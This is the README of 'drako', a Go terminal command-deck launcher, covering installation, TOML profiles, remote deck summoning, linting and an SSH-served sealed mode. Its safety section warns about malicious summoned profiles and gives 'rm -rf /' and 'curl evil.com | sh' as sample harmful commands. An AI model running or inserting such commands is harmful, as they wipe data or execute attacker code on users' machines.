# drako

[![GitHub tag (latest by date)](https://img.shields.io/github/v/tag/lucky7xz/drako?color=007D9C&label=version)](https://github.com/lucky7xz/drako/tags)
[![License](https://img.shields.io/github/license/lucky7xz/drako?color=orange)](https://github.com/lucky7xz/drako/blob/main/LICENCE)
[![Go Version](https://img.shields.io/github/go-mod/go-version/lucky7xz/drako?color=00ADD8&logo=go&logoColor=white)](https://go.dev/)

`drako` represents an entirely new species of terminal tools: the customizable **Command-Deck Launcher**. It is not a menu, nor a shell history. It is a brutalist **architectural framework for any CLI-based workflow**, solidifying your scattered commands, TUIs, and scripts into a cohesive control surface. As such, CLI-driven workflows become remarkably easy to document, distribute, teach, and scale across a team.

https://github.com/user-attachments/assets/21fb2340-bc74-4886-a629-8e95d116e830

## ✨ Features

-   **Harness, don't replace** — if it runs in a terminal, it can be bound to the grid: tools, TUIs, scripts
-   **The Grid** — keyboard-driven command center, up to 729 cells per profile with [Quick Navigation](#-navigation)
-   **Profiles & decks** — grouped commands plus optional [assets](#-summoning-profiles) (configs, scripts) shipped alongside
-   **Summon** — [`drako summon <repo>`](#-summoning-profiles) pulls a deck from any Git host, verifiable with `--sha256`/`--rev`
-   **The Weaver** — [one cell, every OS](#-cross-platform-decks-the-weaver): commands resolve per platform (apt/pacman/brew/…)
-   **Specs & linting** — equip "Work Mode" in [one command](#-profile-specs); keep decks CI-clean with [`drako check`](#-deck-linting)
-   **Batch launch** — mark up to 9 cells (`m`, `b`), launch them together in one tmux session
-   **Glassroot Mode** — a [sealed surface](#-glassroot-mode-experimental) for serving drako over SSH *(experimental)*


<img width="100%" alt="Batch Demo" src="https://github.com/user-attachments/assets/274abaed-1cd8-4c35-8b96-4b37b85556e6" />

## 📡 Try it live

No install — drako served over SSH ([Wish](https://github.com/charmbracelet/wish) + [Glassroot Mode](#-glassroot-mode-experimental)):

-   **`ssh chronyx.xyz`** — you get root on the box while glassroot keeps access sealed: the "glass" over "root"
-   [lucky7xz/groot_demo](https://github.com/lucky7xz/groot_demo) — the exact profile & commands behind the demo

> Experimental and shared — treat it as a public terminal.

## 🚀 Install

> Requires Go **1.24+** —  A `curl | sh` installer is on the roadmap.

```bash
go install github.com/lucky7xz/drako@latest
```

> **Living on the edge?** Swap `@latest` for `@dev` to install the newest changes on the `dev`-branch build — newer, less settled:
> ```bash
> go install github.com/lucky7xz/drako@dev
> ```

Need Go first?

| Platform      | Command                                             |
| ------------- | --------------------------------------------------- |
| Debian/Ubuntu | `sudo apt install golang`                           |
| Arch          | `sudo pacman -S go`                                 |
| macOS         | `brew install go`                                   |
| Windows       | `scoop install go` *or* `winget install GoLang.Go`  |

> **drako is Linux-first.** It's built and battle-tested on Linux, where it gets daily use across distros. macOS and Windows are supported by design (cross-platform decks, native paths and shells) but see far less testing — macOS lightly, Windows barely at all so far. If something misbehaves there, [reports are very welcome](https://github.com/lucky7xz/drako/issues).

**First run:** Go drops binaries in `~/go/bin`, which usually isn't on your `PATH` yet — launch drako by its full path once:

```bash
~/go/bin/drako
```

Once it's open, the **Settings** cell in the Core profile has an **Add go/bin to PATH** command that writes the change to your shell config. Open a new shell afterward and you can just run `drako`.

**Update:** rerun the install command. If you're not getting the latest version:

```bash
GOPROXY=direct go install github.com/lucky7xz/drako@latest
```

> [!NOTE]
> **Emoji Support:** drako profiles sometimes use emojis as visual indicators. Modern terminals (Ghostty, WezTerm etc.) may support them by default. Others (older Linux terminals) may require a [Nerd Font](https://www.nerdfonts.com/) or an emoji font package (e.g., `fonts-noto-color-emoji`).

## 🎴 Decks

The default install is intentionally minimal. Summon curated command decks straight from the **Install Tools** menu in the Core profile, or from the CLI:

-   [**101 Series**](https://github.com/lucky7xz/101-deck) — starter commands for learning the grid: `drako summon https://github.com/lucky7xz/101-deck.git`
-   [**GGML**](https://github.com/lucky7xz/ggml-deck) — llama.cpp / local-LLM workflow: `drako summon https://github.com/lucky7xz/ggml-deck.git`
-   [**groot demo**](https://github.com/lucky7xz/groot_demo) — the profile behind the public SSH demo

Build your own: git-manage a folder of `.profile.toml` files and [`summon`](#-summoning-profiles) your own control panel from any host.

## 🧰 CLI

Beyond the TUI, drako gives you CLI commands for managing decks at scale:

| Command                     | What it does                                                                 |
| --------------------------- | ---------------------------------------------------------------------------- |
| `drako ls`                  | Print every equipped deck as a table — pipe it, grep it, or feed it to an AI |
| `drako explain [profile:]<addr>` | Zoom into one cell: name, actual command, description, auto_close (e.g. `A0`, `work:A1.2`) |
| `drako summon <repo>`       | Pull a deck from any Git host into your inventory; pin with `--sha256`/`--rev` |
| `drako check [path ...]`    | Lint profile files; exits 1 on errors — run it in your deck repo's CI        |
| `drako spec <name>`         | Equip the profiles a spec lists; stash the rest (context switch)             |
| `drako stash <name>`        | Move a spec's profiles to the inventory                                      |
| `drako strip`               | Move every profile to the inventory (next launch: Rescue Mode)               |
| `drako restore-bootstrap`   | Restore any missing bootstrap files (core deck, ssh-utils, themes, specs)     |
| `drako purge`               | Reset or remove configuration — trash-first, `--interactive` available       |
| `drako open <path>`         | Open a file, directory, or URL with the OS default application              |
| `drako --glassroot`         | Launch a sealed surface for SSH/Wish hosting                                 |

Run any of these with no arguments for usage. Details in [Power Tools](#-power-tools) and [Purge](#-purge) below.

---

## 🧭 Navigation

- **Grid Navigation:** Use arrows, `w/a/s/d`, or `h/j/k/l` (customizable in config.toml).
- **Quick Navigation:** For example: pressing `2` and `3` in quick sequence moves the cursor to the 2nd column, 3rd row.
- **Switch Profile:** `m` then `1-9` (leader sequence), or the legacy `Alt` + `1-9` chord.
- **Batch Launch:** `m` then `b`, then `Space` to mark cells and `Enter` to launch them together in tmux (requires tmux; not available in Glassroot Mode). Works inside a folder's dropdown too — `m`, `b` there batches that folder's items.
- **Cycle Profile:** `o` (prev) and `p` (next).
- **Profile Inventory:** `i`. Inside, `e` opens the highlighted profile file in your editor (`$VISUAL`/`$EDITOR`).
- **Lock Current Profile (for launching):** `r`.
- **Grid/Path Toggle:** `Tab`.
- **Path Mode:**
    - **Search:** `e` (type to filter, arrows to select, esc to cancel).
    - **Hidden Files:** `.` to toggle.
    - **Back:** `q` or `Esc`.
- **Quit:** `Ctrl+C` (Global), or `q` (Grid Mode).

> **Customization:** Remap keys in `~/.config/drako/config.toml` under `[keys]`.

## 📇 Profile Creation Example

Create a new file with the `.profile.toml` extension. `drako` will discover it automatically.

For example `~/.config/drako/networking.profile.toml`:

```toml
# Define grid size and theme for this profile.
x = 3
y = 4
theme = "dracula"

[[commands]]
name = "nmap LAN"
command = "nmap -sn 192.168.1.0/24"
col = "a"
row = 0
auto_close_execution = false       # Keep the window open after execution to actually see the output.

[[commands]]
name = "Bandwidth"
command = "bmon"
col = "a"
row = 1
# auto-close true per default      # bmon is a TUI — close its window when it exits.
```

## 🧶 Cross-Platform Decks (The Weaver)

A cell's `command` can be a plain string — or a table of per-platform variants, resolved when the profile loads:

```toml
[[commands]]
name = "Update System"
command = { linux_debian = "sudo apt update && sudo apt upgrade", linux_arch = "sudo pacman -Syu", macos = "brew update && brew upgrade" }
col = "a"
row = 0
```

- **Recognized keys:** `linux_debian`, `linux_arch`, `linux_fedora`, `linux_suse`, `linux_void`, `linux_generic` (fallback for any Linux), `macos`, `windows`.
- On Linux, the distro is detected from `/etc/os-release` (`ID` and `ID_LIKE`) — so e.g. Pop!\_OS resolves to `linux_debian`. The keyword-to-key mapping lives in [`internal/config/platform.go`](internal/config/platform.go) (`DistroKeywords`); adding a distro is a one-line change there.
- Dropdown items (`items = [...]`) accept variant tables too — every entry in a command folder resolves independently.
- **No variant for the current platform?** The deck still loads; the cell just has no command, and its explain popup (`e`) lists which platforms the author covered.

One deck file, every machine. This is what makes summoned decks portable across distros.

## 👢 Bootstrap

On first run, `drako` creates:

- `config.toml`: Global settings (Input Keys, Global Theme).
- `core.profile.toml`: The default command profile (Process Monitor, System Info, etc.) — a variant deck shipped inside the binary, so the same file works on every OS. Deleted or stashed it? `drako restore-bootstrap` restores it — along with any other missing bootstrap file — any time.
- `themes.toml`: Color palettes. The built-in `dracula` theme lives in the binary as the fallback, so it no longer needs to be defined here.

**NOTE:** If you've customized your color schemes, keep a backup of your `themes.toml` — how themes are configured may change in a future release.

**NOTE:** Bootstrapping only occurs if files (config.toml and core.profile.toml) are missing. To clean up, use `drako purge --interactive` or `drako purge --destroyeverything` (backup your work first).

> [!NOTE]
> **Upgrading from an older version?** Your existing `core.profile.toml` keeps working and is never overwritten. It was generated for your OS at install time; the Core deck now ships as a single cross-platform variant deck instead. To switch (optional): `drako purge --target core` (your old file goes to `trash/`), then `drako restore-bootstrap`. Any customizations you made to the old file need to be carried over by hand.

**NOTE:** If drako mis-detects your distro or a default command is wrong for your OS, please open an issue.

## 🪄 Power Tools

### 📋 Listing Decks

`drako ls` prints every equipped profile as a table: cell address, name, and description. The output is deliberately plain — pipe it, grep it, or hand it to an AI agent as instant context for what this machine's control surface can do.

```bash
drako ls
```

`drako explain` zooms into a single cell by the addresses `ls` prints — the CLI twin of the TUI's `e` popup. Bare addresses read the active profile; qualify with `profile:` for any equipped one:

```bash
drako explain A0            # active profile
drako explain work:B2       # equipped profile 'work'
drako explain A1.2          # dropdown item 2 of cell A1
```

### 🪄 Summoning Profiles

Share and reuse command decks across machines and teams. Instead of manually copying profiles, summon them directly from remote sources:

```bash
# Clones the repo, looks for .profile.toml files, discards the temporary repo.
drako summon git@github.com:user/my_profile_collection.git

# Verify what arrived matches what the author published (optional, recommended):
drako summon https://example.com/deck.profile.toml --sha256 <full 64-char hex digest>
drako summon git@github.com:user/repo.git --rev <full 40-char commit hash>
```

**NOTE:** Works with any Git host (GitHub, GitLab, self-hosted). Summoned profiles land in `inventory/`, validated before copying. Summoning without a pin still works — drako just warns that the download is unverified.

If a profile needs extra files (scripts, configs), declare it under `assets = ["relative/path/to/file", ...]`.
`drako` will copy these assets to `~/.config/drako/assets/<profile_name>/`.

You can then reference them in your commands using their full path. This can be useful when managing multiple ansible playbooks using drako, for example.

### 📚 Profile Specs

Apply a "spec" to bulk-manage your profiles.

```bash
# Load a spec (e.g. ~/.config/drako/specs/example.spec.toml)
# Profiles listed are EQUIPPED (visible), others are STORED (inventory/).
# Useful for context switching (e.g. "Work Mode" vs "Gaming Mode").
drako spec example

# Stash profiles listed in the spec (move to inventory/).
# Useful for clearing a specific set of profiles without affecting others.
drako stash example

# Move all profiles to inventory/. With nothing equipped, drako starts
# in Rescue mode — `drako restore-bootstrap` brings the default deck back.
drako strip
```

### ✅ Deck Linting

`drako check` lints profile files for authoring mistakes and prints one row per file. With no arguments it checks every equipped and inventory profile; pass files or directories to check a deck repo instead:

```bash
drako check                  # everything equipped + inventory
drako check path/to/deck/    # a deck repo checkout
```

It exits `1` when any error-level finding exists — wire it into your deck repository's CI and a broken deck never ships.

## ⚠️ Safety First

- **Summoning is a Trust Operation:** When you summon a profile, you are downloading code that `drako` will execute. A malicious profile could contain harmful commands (e.g., `rm -rf /`, `curl evil.com | sh`).
    - **Review before running:** Always inspect the contents of a summoned profile (using `cat` or your editor) *before* you start using it.
    - **Only summon from trusted sources:** Treat a profile URL like you would a binary executable.
    - **Pin when you can:** If the author publishes a checksum or commit hash, pass `--sha256`/`--rev` so drako verifies the download before accepting it.
- **Understand the Commands:** Some entries perform system changes (e.g., package updates, Docker operations). Press `e` in the TUI to read the command description.
- **When Unsure:** Consult documentation or ask a trusted friend/colleague.

## 🗑️ Purge

Safely reset or remove configurations.

```bash
# Remove Core profile (moves to trash/); `drako restore-bootstrap` regenerates it
drako purge --target/-t core

# Remove a specific profile (moves to trash/)
drako purge --target/-t git

# Use interactive mode to purge profiles
drako purge --interactive/-i

# Remove config.toml specifically (to trash/)
drako purge --config

# NUCLEAR OPTION: Delete everything in the .config/drako/ folder (NO TRASH, NO UNDO) 💀
drako purge --destroyeverything
```

## 🚑 Rescue Mode

If your configuration breaks (syntax error, invalid grid), Drako won't crash. It enters **Rescue Mode**.

- **Repair Tools:** Provides buttons to edit `config.toml`, open the config directory, remove broken profiles, or restore the default Core deck.
- **Manual Access:** You can enter `[ Rescue Mode ]` manually via the **Inventory** (`i`).
- **Exit:** Select "Exit Rescue Mode" or switch to a working profile (`o`/`p`) to return to normal operation.

## 🧊 Glassroot Mode (experimental)

`drako --glassroot` launches a sealed, locked-down surface meant for serving drako over SSH with [Wish](https://github.com/charmbracelet/wish). drako ships no SSH server of its own — you write the Wish app, and run drako in glassroot mode inside it.

Over Wish the running program *is* the connection, so glassroot tucks away the local escape hatches that don't belong in a remote session:

- **No Rescue Mode.** A broken profile/config ends the session quietly rather than dropping a guest into Rescue Mode (which would reveal host paths and TOML).
- **No filesystem, inventory, or locking.** Path mode (`Tab`), Inventory (`i`), and Lock (`r`) are off.
- **No clipboard.** Copy (`y`) is disabled.
- A `🧊 G-ROOT` badge shows in the header.

Glassroot locks the interface, but the commands still do whatever they do — so it's worth curating the deck before you open it up. A good pre-flight:

- Equip just the profiles you'd like to share, and stash the rest.
- Give each command a once-over, including the TUIs they open — a command that opens a shell or writes files quietly widens what a guest can touch, with security implications worth taking seriously. The more familiar you are with what you're sharing, the more secure the hosting.

> Hosting drako over Wish is still experimental — feedback welcome.

## Roadmap

 - [x] Update Bootstrap collection
 - [x] Summon profiles incl assets
 - [x] DRY Refactor
 - [x] Grid Size Safety & Rescue Mode
 - [x] Per-platform command variants (cross-platform decks)
 - [x] Summon verification pins (`--sha256` / `--rev`)
 - [x] `drako ls` — deck listing for pipes, scripts & AI agents
 - [x] `drako check` — deck linter, CI-ready
 - [~] Glassroot Mode

 ## Dev
 - [~] Full unit test suite
 - [ ] CI/CD
 - [ ] Install
 - [ ] Auto Update

 ### Support
 - [~] MacOS support (untested)
 - [~] Windows support (untested)
 - [~] ARM Support (untested)
 - [ ] Mouse Support
 - [ ] Steamdeck Support
 - [ ] Touch Support
---

## 🤝 Contribution

Ideas are welcome. Bugs will be hunted. drako follows an SQLite-style contribution model — full details in [docs/CONTRIBUTING.md](docs/CONTRIBUTING.md):

-   **Issues:** Bug reports, feature ideas, and design discussion — yes, please.
-   **Pull Requests:** Not accepted; they are closed without review, with thanks. drako's code stays single-author for now (the AGPL still grants you freedom to fork and modify).
-   **Beta State:** `drako` is currently in (ealy) Beta. The project is relatively stable but still evolving.

---

## ❤️ Built with

drako is a single static Go binary with no runtime dependencies. Direct build dependencies only — [`go.mod`](go.mod) is the full, authoritative list. Special thanks to Charmbracelet:

- [`charmbracelet/bubbletea`](https://github.com/charmbracelet/bubbletea) — the model/view/update loop
- [`charmbracelet/lipgloss`](https://github.com/charmbracelet/lipgloss) — layout and styling
- [`BurntSushi/toml`](https://github.com/BurntSushi/toml) — profile & config parsing
- [`shirou/gopsutil`](https://github.com/shirou/gopsutil) — system info (process monitor, sysinfo)
- [`fsnotify/fsnotify`](https://github.com/fsnotify/fsnotify) — config/profile file watching
- [`golang.org/x/term`](https://pkg.go.dev/golang.org/x/term) — terminal handling

## 🤖 AI disclosure

drako is developed with heavy AI assistance — code, research, and docs. The codebase is deliberately kept small and modular so it can be audited end to end by one person. Judge the code, not the typing method.

## 📜 License

The core Drako engine is released under the [GNU Affero General Public License v3.0](LICENCE). Bootstrap assets are released under the [MIT license](internal/config/bootstrap/LICENSE-MIT).

## 🔗 Resources

| Decks                                                 | Project                                    |
| ----------------------------------------------------- | ------------------------------------------ |
| [101 Series](https://github.com/lucky7xz/101-deck)    | [Contributing](docs/CONTRIBUTING.md)       |
| [GGML](https://github.com/lucky7xz/ggml-deck)         | [Roadmap](#roadmap)                        |
| [groot demo](https://github.com/lucky7xz/groot_demo)  | [License (AGPL-3.0)](LICENCE)              |

---
<div align="center">

Tame the chaos.

</div>
